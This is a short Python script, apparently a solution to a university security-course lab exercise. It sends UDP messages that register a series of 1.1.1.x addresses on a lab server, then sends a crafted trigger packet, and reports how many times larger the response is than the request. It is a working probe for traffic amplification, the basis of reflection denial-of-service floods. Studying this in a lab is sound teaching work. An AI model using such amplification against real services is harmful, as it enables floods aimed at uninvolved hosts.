#!/usr/bin/env python

from scapy.all import * 

import socket
import sys

SERVER_IP = "cs177.seclab.cs.ucsb.edu"

def main():
    if len(sys.argv) != 2:
        print("Usage: python dns_amplify.py <port>")
        return 1

    port = int(sys.argv[1])

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    for i in range(50):
        ip = f"1.1.1.{i}"
        request = f"TimeRequest {ip}".encode()
        print(f"[+] Sending IP: {ip}")
        s.sendto(request, (SERVER_IP, port))

    request = b"0x1f" + 47 * b"\x00"
    print("[+] Sending trigger packet")
    s.sendto(request, (SERVER_IP, port))

    data = b""

    while True:
        response, _ = s.recvfrom(4096)
        
        if not response:
            break
        
        print(f"[+] Received chunk: {len(response)} bytes")
        data += response

    if data:
        request_size = len(request)
        response_size = len(data)

        print(f"Request Size: {request_size}")
        print(f"Response Size: {response_size}")
        print(f"BAF: {response_size / request_size:.2f}")
    else:
        print("No response")

if __name__ == "__main__":
    main()
